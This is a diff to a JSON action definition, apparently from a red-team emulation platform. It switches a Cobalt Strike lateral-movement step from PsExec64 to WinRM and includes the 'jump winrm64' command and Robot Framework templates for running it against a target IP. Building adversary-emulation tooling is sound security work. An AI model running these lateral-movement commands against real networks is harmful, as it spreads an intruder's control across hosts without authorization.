@@ -1,17 +1,17 @@
 {
-  "_key": "cs-lateral-psexec",
-  "name": "Lateral Move PsExec64",
-  "description": "Move laterally to a target host using PsExec via Cobalt Strike bjump",
-  "icon": "\ud83d\ude80",
+  "_key": "cs-lateral-winrm",
+  "name": "Lateral Move WinRM",
+  "description": "Move laterally to a target host using WinRM via Cobalt Strike bjump",
+  "icon": "\ud83d\udd17",
   "tactic": "TA0008",
   "category": "Cobalt Strike",
   "subcategory": "Lateral Movement",
   "riskLevel": "High",
   "estimatedDuration": 30,
   "executionType": "cobalt_strike",
-  "robotKeyword": "Lateral Move With Psexec64",
-  "robotTemplate": "${result}=    Run Bjump    ${session}    psexec64    ${target_ip}    ${listener_name}",
-  "cobaltStrikeCommand": "jump psexec64 ${target_ip} ${listener_name}",
+  "robotKeyword": "Lateral Move With Winrm",
+  "robotTemplate": "${result}=    Run Bjump    ${session}    winrm64    ${target_ip}    ${listener_name}",
+  "cobaltStrikeCommand": "jump winrm64 ${target_ip} ${listener_name}",
   "inputs": [
     {
       "id": "session",
@@ -61,7 +61,7 @@
     "libraries": [
       "cobaltstrikec2/cobaltstrike.py"
     ],
-    "keyword": "Lateral Move With Psexec64",
+    "keyword": "Lateral Move With Winrm",
     "captureOutput": "LATERAL_RESULT",
     "keywordArgs": [
       {
@@ -83,7 +83,6 @@
     ],
     "sessionVariable": "CURRENT_SESSION",
     "variables": [],
-    "preKeywordLog": "Laterally moving to ${target_ip} via PsExec64",
-    "postKeywordLog": "Lateral movement successful"
+    "preKeywordLog": "Laterally moving to ${target_ip} via WinRM"
   }
 }
